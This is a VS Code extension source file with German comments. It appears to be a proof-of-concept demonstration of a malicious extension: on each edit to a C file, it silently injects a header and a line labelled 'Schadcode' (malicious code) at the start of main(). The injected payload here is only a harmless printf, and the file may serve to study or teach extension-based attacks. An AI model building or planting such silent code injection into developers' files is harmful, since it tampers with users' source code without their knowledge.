const vscode = require('vscode');



function activate(context) {
    // Es wird auf dad Event onDidChangeTextDocument gewartet.
    let compileSymbolDisposable = vscode.workspace.onDidChangeTextDocument((editor) => {

            // Zugriff auf die aktive Datei
            var activeEditor = vscode.window.activeTextEditor

            // überprüfen ob der aktiveeditor und der geänderte Text gleiche Inhalt haben.
            if(activeEditor.document.getText()!=editor.document.getText()){
                console.log("kein aktives editor")
                return
            }

            // Wenn es keine C-Datei ist, beenden
            if (activeEditor.document.languageId != "c") {
                console.log("Keine C-Datei gefunden");
                return;
            }

        
            // Überprüfen, ob der aktive Editor eine Datei ist
            if (activeEditor && activeEditor.document && activeEditor.document.uri && activeEditor.document.uri.scheme === 'file') {

                // aktive editor einlesen 
                const file_content = activeEditor.document.getText();

                // Ausdruck um die main funktion zu finden, Schadcode und Headerdatei werden definiert.
                let insert_after = /main\s*\([\s\S]*?\)\s*{/i;
                let malicious_code = '\nprintf("helloworld");\n';
                let lib='\n#include <stdio.h>\n'
                  

                // Überprüfen, ob main funktion gefunden
                let match = insert_after.exec(file_content);
                if (!match) {
                    console.log("Keine 'main'-Funktion gefunden");
                    return;
                }

                //Überprüfen, ob die Headerdatei schon im Quellcode enthalten
                if(!file_content.includes('#include <stdio.h>')){

                    
                    try{

                       // Headr wird am Anfang des Quellcodes injiziert.
                       activeEditor.edit((editBuilder) => {editBuilder.insert(activeEditor.document.positionAt(0),lib); });
                    }
                    catch (err){
                       console.error("fehler bei injiziren der Header Datei"+ err)
                    }  
                }

                // überprüfen on der Schadcode schon im Quellcode entahlten
                if (!file_content.includes('printf("helloworld");')) {

                    // Index für die Injektion am Anfang der Main-Funktion
                    let insert_position = activeEditor.document.positionAt(file_content.match(insert_after).index + file_content.match(insert_after)[0].length);


                    try{ 

                        // Schadcode wird am Anfang der Main-Funktion injiziert.
                        activeEditor.edit((editBuilder) => {editBuilder.insert(insert_position, malicious_code) });

                    }
                    catch (err){
                        console.error("fehler bei injection"+ err)
                    }
                    
                }
               
              
                

            }

      

    });

    // diese Zeile(nummer 87) wurde schon nach Erstellung von der Erweiterung zur Verfügung gestellt.
    context.subscriptions.push(compileSymbolDisposable);
    
}

/**
 * Diese wurde schon nach Erstellung von der Erweiterung zur Verfügung gestellt.
 */
module.exports = {
	activate
}
